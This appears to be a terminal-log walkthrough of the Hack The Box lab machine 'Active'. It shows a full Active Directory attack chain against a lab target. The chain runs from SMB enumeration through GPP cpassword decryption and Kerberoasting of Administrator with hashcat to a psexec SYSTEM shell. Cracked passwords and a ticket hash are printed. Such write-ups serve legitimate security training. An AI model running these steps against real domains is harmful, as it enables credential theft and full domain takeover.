# Active

──╼ [★]$ sudo nmap -sCV 10.129.15.157
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-17 11:23 EDT
Nmap scan report for 10.129.15.157
Host is up (0.0079s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-17 15:23:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-17T15:24:42
|_  start_date: 2026-06-17T15:22:22

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 70.33 seconds

└──╼ [★]$ cme smb 10.129.15.157 -u '' -p '' --shares
SMB         10.129.15.157   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.157   445    DC               [+] active.htb\:
SMB         10.129.15.157   445    DC               [*] Enumerated shares
SMB         10.129.15.157   445    DC               Share           Permissions     Remark
SMB         10.129.15.157   445    DC               -----           -----------     ------
SMB         10.129.15.157   445    DC               ADMIN$                          Remote Admin
SMB         10.129.15.157   445    DC               C$                              Default share
SMB         10.129.15.157   445    DC               IPC$                            Remote IPC
SMB         10.129.15.157   445    DC               NETLOGON                        Logon server share
SMB         10.129.15.157   445    DC               Replication     READ

SMB         10.129.15.157   445    DC               SYSVOL                          Logon server share
SMB         10.129.15.157   445    DC               Users

cme smb 10.129.15.157 -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.129.15.157   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.157   445    DC               [+] active.htb\:
SPIDER_PLUS 10.129.15.157   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.15.157   445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.15.157   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.15.157   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.15.157   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.15.157   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.15.157   445    DC               [*]  OUTPUT_FOLDER: /home/ronking37/.nxc/modules/nxc_spider_plus
SMB         10.129.15.157   445    DC               [*] Enumerated shares
SMB         10.129.15.157   445    DC               Share           Permissions     Remark
SMB         10.129.15.157   445    DC               -----           -----------     ------
SMB         10.129.15.157   445    DC               ADMIN$                          Remote Admin
SMB         10.129.15.157   445    DC               C$                              Default share
SMB         10.129.15.157   445    DC               IPC$                            Remote IPC
SMB         10.129.15.157   445    DC               NETLOGON                        Logon server share
SMB         10.129.15.157   445    DC               Replication     READ
SMB         10.129.15.157   445    DC               SYSVOL                          Logon server share
SMB         10.129.15.157   445    DC               Users
SPIDER_PLUS 10.129.15.157   445    DC               [+] Saved share-file metadata to "/home/ronking37/.nxc/modules/nxc_spider_plus/10.129.15.157.json".
SPIDER_PLUS 10.129.15.157   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.15.157   445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.15.157   445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.15.157   445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.15.157   445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.15.157   445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.15.157   445    DC               [*] File size max:        3.63 KB
SPIDER_PLUS 10.129.15.157   445    DC               [*] File unique exts:     4 (pol, inf, xml, ini)
SPIDER_PLUS 10.129.15.157   445    DC               [*] Downloads successful: 7
SPIDER_PLUS 10.129.15.157   445    DC               [+] All files processed successfully.
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-cd1soy01cj]─[~]
└──╼ [★]$ ls
cacert.der  Downloads  numbers.txt  shell.php  websocket_fuzzer
Desktop     Music      Pictures     Templates  ws_bridge.py
Documents   my_data    share        Videos
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-cd1soy01cj]─[~]
└──╼ [★]$ cd /home/ronking37/.nxc/modules/nxc_spider_plus/
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-cd1soy01cj]─[~/.nxc/modules/nxc_spider_plus]
└──╼ [★]$ ls
10.129.15.157  10.129.15.157.json
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-cd1soy01cj]─[~/.nxc/modules/nxc_spider_plus]
└──╼ [★]$ cat 10.129.15.157
cat: 10.129.15.157: Is a directory
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-cd1soy01cj]─[~/.nxc/modules/nxc_spider_plus]
└──╼ [★]$ cat 10.129.15.157.json
{
"Replication": {
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "23 B"
},
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "119 B"
},
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "1.07 KB"
},
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "533 B"
},
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "2.72 KB"
},
"active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "22 B"
},
"active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
"atime_epoch": "2018-07-21 06:37:44",
"ctime_epoch": "2018-07-21 06:37:44",
"mtime_epoch": "2018-07-21 06:38:11",
"size": "3.63 KB"
}
}

cat groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

└──╼ [★]$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

svc_tgs:GPPstillStandingStrong2k18

cme smb 10.129.15.157 -u 'svc_tgs' -p "GPPstillStandingStrong2k18"
SMB         10.129.15.157   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.157   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18

python3 [bloodhound.py](http://bloodhound.py/) -u 'svc_tgs' -p "GPPstillStandingStrong2k18" -d active.htb -c all --zip -ns 10.129.15.157

cme smb 10.129.15.157 -u 'svc_tgs' -p "GPPstillStandingStrong2k18" --shares
SMB         10.129.15.157   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.157   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
SMB         10.129.15.157   445    DC               [*] Enumerated shares
SMB         10.129.15.157   445    DC               Share           Permissions     Remark
SMB         10.129.15.157   445    DC               -----           -----------     ------
SMB         10.129.15.157   445    DC               ADMIN$                          Remote Admin
SMB         10.129.15.157   445    DC               C$                              Default share
SMB         10.129.15.157   445    DC               IPC$                            Remote IPC
SMB         10.129.15.157   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.15.157   445    DC               Replication     READ

SMB         10.129.15.157   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.15.157   445    DC               Users           READ

according to bloodhound, Administrator is kerberoastable

impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.129.15.157 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation

---

active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-06-17 11:23:22.270549

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f892bd314e8054edacbac0c47c7eb409$387150861ca6e3df2f6dd52ccb86bf996a5a764f3dde13981f301b5ad64bbd192626ef2451319163be532fff0242982a1d4ceaae201ec90ad5048fb3c64fea24d12e6f3dddef7e36223806bf6db07861de62e00abd44110fdbc97afe9e48eff237a42d53c80c4e47586a92e21093d75b8b8e087aabed6c5131ee8e4dbe798b2ed1150cb1b9c01c2e5c5bdc1a6b12c1f9989a2a881a2920733e9abe1cf0be49af8685bba2bf9de7a12018c4b924e4fdb0d21e3b002fbd23f7e8bc8c93113a6e5ac982b19a516d7d091bc0ef15b39845094f197084ee0807dead3b74013a3d3a101e6ed37220aaa0fb34e03727aa38cca91611079761cb6089ded14c2197a8b4387e3606b7d37b671262fb89431229398f55a1adc730ab57875b7430986d7bcbc847e830dbf19e4e832c925bd886da6b1d276bf37eb5f41055f3bda50e85347247d4e06e0af004729478bdcba856e338f1a4448621f8a0b058ffe1e3f64935a9c2f0b7d141d3f0276c98927a7f7807b118145ef1d744034fcb854b336d6a7ab1b59a9715ffc2cf05fafdb1bc0c366ba94582919cc70e4c0a2a48eaa36fea9d47cdd7bee3b03511699065f72a5e976d10f1e742818f5bd0d8ee536f098daa1d121751a375d16618ffcd2dac36f270a51c6aa6e23a0aa76f90d679cefdcd54d802731acc4f60417901b060e18b91cccb613e29ac2c0f3b883d8003e04c9bb72880f37f80c1683b4605500dce79a3adf2ecb0ffca959f73826629f248af5d7d92fa952a2893340d35a5f60e52f7d97400d7e4f718dd744932d17def6d795807495127a5d2a8b075ec73eebf5b5fb52f9d1ccc5c10325d7650a82680aa77de139706221946adadd3ca4347a9e60682475cfbd8d349878b34f634d774404475c071c77c1d2f6f70ac4b67e2954a18e35c288097b3f6d13cd3ecc10969959e797f6d2387a168cb766f717ca6a4c87374e13ba307252e0d0123bba7b4274333df5c3e6142b64625cf5425f681ab1f362de932022ec8285ad2c0348fc52110d46ad69b71cf8d753b06fc48e5c46618b64fcbb7e1e3e40d0d2ea50da936aab106bcd00f1a75240044d98f946280de2021e6753872d1ae45f71f6d0bf578c8e2ad766738c26bb1ee58635ae419236db6083dda2bc2e6491d5aa63e7f42f0e42deb9ab636a17e73995187e9f90519ffa6ab58fa15eb910a980d276141f34198ca537aece56096c03f9e059ac82a259dd7a3f12b23eae7467cee9f8af61f4807f7

sudo hashcat -m 13100 admin.krb /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashcat/rules/best64.rule

Administrator:Ticketmaster1968

impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb -dc-ip 10.129.15.157
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file gdxyOLgu.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service mvra on active.htb.....
[*] Starting service mvra.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 15BB-D59C

Directory of C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
b45e8d39f472a4c25e087ff123431808